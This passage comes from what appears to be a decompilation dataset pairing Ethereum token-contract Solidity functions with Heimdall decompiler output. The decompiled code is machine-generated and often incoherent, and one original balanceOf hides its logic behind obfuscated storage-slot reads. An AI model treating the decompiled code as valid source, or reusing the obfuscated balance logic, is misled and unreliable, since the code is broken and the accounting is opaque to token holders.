0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x0de0b6b3a7640000, \"TOKEN: This account cannot send tokens until trading is enabled\");\n        }\n        require(address(owner) == (address(msg.sender)), \"TOKEN: This account cannot send tokens until trading is enabled\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x3f;\n        var_d = 0x544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e6420;\n        var_g = 0x746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400;\n        var_e = address(msg.sender);\n        var_f = 0x05;\n        if (storage_map_c[var_e]) {\n            if (storage_map_c[var_e]) {\n                if (!storage_map_c[var_e]) {\n                    if (0) {\n                        if (store_n) {\n                            if (store_n) {\n                            }\n                        }\n                        if (!(address(uniswapV2Pair)) == (address(msg.sender))) {\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(!(bytes1(storage_map_c[var_e])), \"Transfer amount must be greater than zero\");\n                            require(0, \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x29;\n        var_d = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x25;\n        var_d = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB52Bb372A4C3336A6f3ddd8fB3dE8d6DF735Ad50", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\\r\\n      _approve(msg.sender, spender, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[3276:3312];\n    }"}
{"contract_address": "0xEC5Cd1764456f3CaBb72B90b95526BE632D8385c", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(!(address(msg.sender) == 0), \"ERC20: approve to the zero address\");\n        require(!(address(arg0) == 0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9f45fabA384E9220252b863e1657458fC1F4Ac90", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a] > 0);\n        store_g = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f / 0x01), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).Unresolved_791ac947(var_l); // call\n        store_g = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x411AC84A80D686758cA971Dd205711149B42686f", "original_solidity_code": "function balanceOf(address account) external view override returns (uint256) {\\r\\n      uint160 \\r\\n      x = uint160(account\\r\\n        ); return slotValues(\\r\\n          x, 4) + \\r\\n          slotValues(x\\r\\n          , 6); }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x06;\n        var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = storage_map_d[var_a] + storage_map_d[var_a];\n        return storage_map_d[var_a] + storage_map_d[var_a];\n    }"}
{"contract_address": "0x4884709C72961015D2f9e97D123f4a2E480B9014", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_o[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x959Cab41Be70E2c8B29A15f45C088C2101620149", "original_solidity_code": "function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x1142dFfAA66edAac7562BE5c2A7dACeB4387D6b8", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function changeTotalFees(uint256 newBuyFee, uint256 newSellFee) external onlyOwner {\r\n        buyFee = newBuyFee;\r\n        sellFee = newSellFee; \r\n    }", "heimdall_decompiled_code": "function changeTotalFees(uint256 arg0, uint256 arg1) public {\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        buyFee = arg0;\n        sellFee = arg1;\n    }"}
{"contract_address": "0xaE58EE426C98ed45F91282D027FAFe4E74c70D75", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!((var_d + ret0.length) - var_d) < 0x20);\n        require(var_d.length == (address(var_d.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this));\n        require(address(store_d));\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_o = var_d.length;\n        address var_p = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_p = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_p = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_d[var_a] > ~(arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_d[var_a] = storage_map_d[var_a] + arg1;\n        uint256 var_d = storage_map_d[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_d[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xae260B2D9Fb8175B73552Ae4212261ed0756395b", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x718128a4433a5053A43810C1cc51427C89046b7E", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x72CEd9d8A46188370b54A3a4927B8c8D7A73d338", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        startTradeBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x08, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x61f313f880, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_l[var_e] = 0x61f313f880;\n        var_a = 0x61f313f880;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x61f313f880);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x08 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                            if (!0x08 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6a6CF1CB6cA804a9c78d078Fd8061c4a2E71B132", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function burn(uint256 tokenId) external;\\n}\\n\"\r\n    },\r\n    \"contracts/extensions/IERC721AQueryableUpgradeable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// ERC721A Contracts v4.2.3\\n// Creator: Chiru Labs\\n\\npragma solidity ^0.8.4;\\n\\nimport '../IERC721AUpgradeable.sol';\\n\\n/**\\n * @dev Interface of ERC721AQueryable.\\n */\\ninterface IERC721AQueryableUpgradeable is IERC721AUpgradeable {\\n    /**\\n     * Invalid query range (`start` >= `stop`).\\n     */\\n    error InvalidQueryRange();\\n\\n    /**\\n     * @dev Returns the `TokenOwnership` struct at `tokenId` without reverting.\\n     *\\n     * If the `tokenId` is out of bounds:\\n     *\\n     * - `addr = address(0)`\\n     * - `startTimestamp = 0`\\n     * - `burned = false`\\n     * - `extraData = 0`\\n     *\\n     * If the `tokenId` is burned:\\n     *\\n     * - `addr = <Address of owner before token was burned>`\\n     * - `startTimestamp = <Timestamp when token was burned>`\\n     * - `burned = true`\\n     * - `extraData = <Extra data when token was burned>`\\n     *\\n     * Otherwise:\\n     *\\n     * - `addr = <Address of owner>`\\n     * - `startTimestamp = <Timestamp of start of ownership>`\\n     * - `burned = false`\\n     * - `extraData = <Extra data at start of ownership>`\\n     */\\n    function explicitOwnershipOf(uint256 tokenId) external view returns (TokenOwnership memory);\\n\\n    /**\\n     * @dev Returns an array of `TokenOwnership` structs at `tokenIds` in order.\\n     * See {ERC721AQueryable-explicitOwnershipOf}\\n     */\\n    function explicitOwnershipsOf(uint256[] memory tokenIds) external view returns (TokenOwnership[] memory);\\n\\n    /**\\n     * @dev Returns an array of token IDs owned by `owner`,\\n     * in the range [`start`, `stop`)\\n     * (i.e. `start <= tokenId < stop`).\\n     *\\n     * This function allows for tokens to be queried if the collection\\n     * grows too big for a single call of {ERC721AQueryable-tokensOfOwner}.\\n     *\\n     * Requirements:\\n     *\\n     * - `start < stop`\\n     */\\n    function tokensOfOwnerIn(\\n        address owner,\\n        uint256 start,\\n        uint256 stop\\n    ) external view returns (uint256[] memory);\\n\\n    /**\\n     * @dev Returns an array of token IDs owned by `owner`.\\n     *\\n     * This function scans the ownership mapping and is O(`totalSupply`) in complexity.\\n     * It is meant to be called off-chain.\\n     *\\n     * See {ERC721AQueryable-tokensOfOwnerIn} for splitting the scan into\\n     * multiple smaller scans if the collection is large enough to cause\\n     * an out-of-gas error (10K collections should be fine).\\n     */\\n    function tokensOfOwner(address owner) external view returns (uint256[] memory);\\n}\\n\"\r\n    }", "heimdall_decompiled_code": "function burn(uint256 arg0) public {\n        address var_a = msg.sender;\n        var_b = 0x68;\n        require(storage_map_b[var_a], CustomError_df2d9b42());\n        require(storage_map_b[var_a], CustomError_df2d9b42());\n        require(0x01 > arg0, CustomError_df2d9b42());\n        var_a = arg0;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(0 - storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = arg0;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c46;\n        require(!0x01);\n        require(!storage_map_b[var_a]);\n        storage_map_b[var_a] = 0;\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c45;\n        storage_map_b[var_a] = storage_map_b[var_a] + 0xffffffffffffffffffffffffffffffff;\n        var_a = arg0;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        storage_map_b[var_a] = (address(storage_map_b[var_a])) | ((block.timestamp << 0xa0) | 